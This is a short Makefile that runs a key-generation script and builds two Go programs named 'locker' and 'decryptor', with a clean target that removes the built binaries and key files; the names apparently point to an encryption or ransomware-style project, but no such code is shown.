all: 
	./genkey.sh
	go build -o bin/locker locker/main.go
	go build -o bin/decryptor decryptor/main.go

clean:
	rm -rf bin/*
	rm private.key
	rm locker/public.key